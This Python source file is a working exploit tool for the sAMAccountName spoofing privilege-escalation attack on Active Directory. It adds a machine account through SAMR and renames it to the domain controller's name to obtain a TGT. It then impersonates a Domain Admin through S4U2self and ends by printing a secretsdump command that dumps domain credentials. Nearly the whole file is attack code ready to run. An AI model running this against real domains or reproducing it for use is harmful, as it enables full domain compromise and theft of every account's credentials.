import ldap3
import sys
import os
import argparse

from my_print import *
from utils.helper import GETTGT
from utils.S4U2self import GETST
from impacket.dcerpc.v5 import samr, epm, transport
from ldap3.core.exceptions import LDAPCursorError, LDAPBindError


class SamExploit:
	def __init__(self, options, computer_name='test$', computer_pass='test_p4ss!', method='SAMR'):
		self.options = options

		self.dc_name = options.dc_name
		self.domain_name = options.domain_name
		self.dc_ip = options.dc_ip

		self.username = options.u
		self.password = options.p

		self.computer_name = computer_name
		self.computer_pass = computer_pass
		self.method = method

		self.target_da = options.target_da

		self.server = None
		self.conn = None
		self.rpctransport = None
		self.search_b = None


	def init_ldap(self):
		self.server = ldap3.Server(options.dc_ip, get_info=ldap3.ALL)
		self.conn = ldap3.Connection(self.server, user=f'{self.domain_name}\\{self.username}', password=self.password, authentication=ldap3.NTLM)
		try:
			self.conn.bind()
			if(self.conn.result['description'] != 'invalidCredentials'):
				success(f'Connected with user: {self.username}/{self.password}')
			else:
				raise LDAPBindError
		except LDAPBindError:
			warn(f'Impossible to connect with user: {self.username}/{self.password}')
			self.conn = None

	def computer_exist(self):
		self.conn.search(self.search_b, f'(samAccountName={self.computer_name})', attributes=['objectSid'])
		return len(self.conn.entries) == 1

	def init_rpc(self):
		stringBinding = epm.hept_map(self.dc_ip, samr.MSRPC_UUID_SAMR, protocol = 'ncacn_np')
		self.rpctransport = transport.DCERPCTransportFactory(stringBinding)
		self.rpctransport.set_dport(445)
		if hasattr(self.rpctransport, 'set_credentials'):
			self.rpctransport.set_credentials(self.username, self.password)
			return True
		else:
			warn("Couldn't set RPC credentials..")
			return False

	def add_computer(self, c_name, c_pass):
		self.samrAdd(c_name, c_pass, 'add')
		self.conn.search(self.search_b, f'(samAccountName={self.computer_name})', attributes=['objectSid'])

		try:
			dn = self.conn.entries[0].entry_dn
			success("Computer added !")
			log(f"Computer DN: {dn}")
			return dn

		except Exception as e:
			warn("Couldn\'t add a computer :(")
			return False

		return False

	def init_all(self):
		self.init_ldap()
		self.init_rpc()
		self.dns2ldap()

	def remove_computer(self, c_name, c_pass):
		self.conn.search(self.search_b, f'(samAccountName={c_name})', attributes=['objectSid'])
		try:
			dn = self.conn.entries[0].entry_dn
			log(f"Computer DN: {dn}")

		except Exception as e:
			warn(f"Couldn\'t find computer: {c_name}")
			return False

		self.samrAdd(c_name, c_pass, 'delete')


	def rename_computer(self, dn, new_name):
		self.conn.modify(dn, {'sAMAccountName':[ldap3.MODIFY_REPLACE, [new_name]]})
		if(self.conn.result['result'] == 0):
			success(f'Computer renamed successfully to: {new_name}')
			return 0
		else:
			warn(f"Couldn't rename the computer to: {new_name}")
			return 1

	def dns2ldap(self):
		self.search_b = 'DC=' + ',DC='.join(self.domain_name.split('.'))

	def samrAdd(self, c_name, c_pass, action):
		dce = self.rpctransport.get_dce_rpc()
		try:
			dce.connect()
			dce.bind(samr.MSRPC_UUID_SAMR)

			samrConnectResponse = samr.hSamrConnect5(dce, f'\\\\{self.dc_name}\x00', samr.SAM_SERVER_ENUMERATE_DOMAINS | samr.SAM_SERVER_LOOKUP_DOMAIN )
			srvHandle = samrConnectResponse['ServerHandle']

			### If you don't know the domain name, not my case
			# samrEnumResponse = samr.hSamrEnumerateDomainsInSamServer(dce, srvHandle)
			# domains = samrEnumResponse['Buffer']['Buffer']

			samrLookupDomainResponse = samr.hSamrLookupDomainInSamServer(dce, srvHandle, self.domain_name)
			domainSID = samrLookupDomainResponse['DomainId']
			
			samrOpenDomainResponse = samr.hSamrOpenDomain(dce, srvHandle, samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER , domainSID)
			domainHandle = samrOpenDomainResponse['DomainHandle']

			### Add a computer
			if(action == 'add'):
				createUser = samr.hSamrCreateUser2InDomain(dce, domainHandle, c_name, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE,)
				userHandle = createUser['UserHandle']

				samr.hSamrSetPasswordInternal4New(dce, userHandle, c_pass)
				success(f'Successfully add {c_name} with {c_pass} to the domain !')

			elif(action == 'delete'):
				log('Deleting...')
				access = samr.DELETE
				checkForUser = samr.hSamrLookupNamesInDomain(dce, domainHandle, [c_name])
				userRID = checkForUser['RelativeIds']['Element'][0]

				openUser = samr.hSamrOpenUser(dce, domainHandle, access, userRID)
				userHandle = openUser['UserHandle']
				samr.hSamrDeleteUser(dce, userHandle)
				success(f'Computer {c_name} deleted !')

		except Exception as e:
			print(e)

	def samr_exp(self):
		if(self.conn is None):
			return 1

		if(self.computer_exist()):
			warn('Computer already exist, trying to remove it...')
			self.remove_computer(self.computer_name, self.computer_pass)
			return 1

		dn = self.add_computer(self.computer_name, self.computer_pass)
		if(dn == False):
			return 1

		self.rename_computer(dn, self.dc_name)

		### Requesting a TGT
		log(f'Requesting TGT for {self.dc_name}...')
		getting_tgt = GETTGT(self.dc_name, self.computer_pass, self.domain_name, self.options)

		try:
			getting_tgt.run()
			success(f'TGT Granted !')

		except Exception as e:
			warn("Couldn't get a TGT... (maybe this user cannot)")
			print(e)
			return 1

		dcticket = str(self.dc_name + '.ccache')
		os.environ["KRB5CCNAME"] = dcticket

		self.rename_computer(dn, self.computer_name)


		### Trying to impersonate a DA
		silver_ticket = GETST(None, None, self.domain_name, self.options,
		    impersonate_target=self.target_da,
		    target_spn=f"cifs/{self.dc_name.lower()}.{self.domain_name.lower()}")
		try:
			silver_ticket.run()
			success('SAM Worked, use the TGS as you wish !!')
		except Exception as e:
			warn('Exploit failed..')
			print(e)

		adminticket = str(self.target_da + '.ccache')
		os.environ["KRB5CCNAME"] = adminticket

		log(f"export KRB5CCNAME='{self.target_da}.ccache'; secretsdump.py -k {self.dc_name}.{self.domain_name}")


if __name__ == '__main__':
	"""
	Exemple:
		python3 sam_spoof.py -dc-name dc -domain-name domain -dc-ip 192.168.56.11 -u arya -p needle -target-da eddard
	"""
	parser = argparse.ArgumentParser(add_help = True, description = "Sam account spoofing exploit")
	parser.add_argument('-dc-name', action='store', metavar = "DC name", help='Hostname of the domain controller to use')
	parser.add_argument('-domain-name', action='store', metavar = "Domain name", help='Domain name to use')
	parser.add_argument('-dc-ip', action='store', metavar = "DC Ip", help='Ip of the domain controller to use')
	parser.add_argument('-u', action='store', metavar='username', help='username to use for auth')
	parser.add_argument('-p', action='store', metavar='password', help='passord to use for auth')
	parser.add_argument('-target-da', action='store', metavar='Domain Admin', help='Domain Admin to spoof')
	parser.add_argument('-hashes', action='store', metavar='NTLM', help='NTLM hashes')
	parser.add_argument('-aesKey', action='store', metavar='AES Key', help='No idea, just wtf !!')

	options = parser.parse_args()

	if(len(sys.argv) == 1):
		warn('No arguments specified..')
		exit(0)

	domain_name, dc_name, dc_ip, username, password = options.domain_name, options.dc_name, options.dc_ip, options.u, options.p
	if(dc_name == None or dc_ip == None or username == None or password == None):
		warn(f'DC hostname / ip  and user/password should be specified:\n\t- python3 {sys.argv[0]} -dc-host <host> -dc-ip <ip> -u <username> -p <password>')
		exit(0)

	log("Don't forget to remove computer after test: test$")

	### dc_name, domain_name, dc_ip, username, password
	SamAdmin = SamExploit(options)
	SamAdmin.init_all()
	SamAdmin.samr_exp()


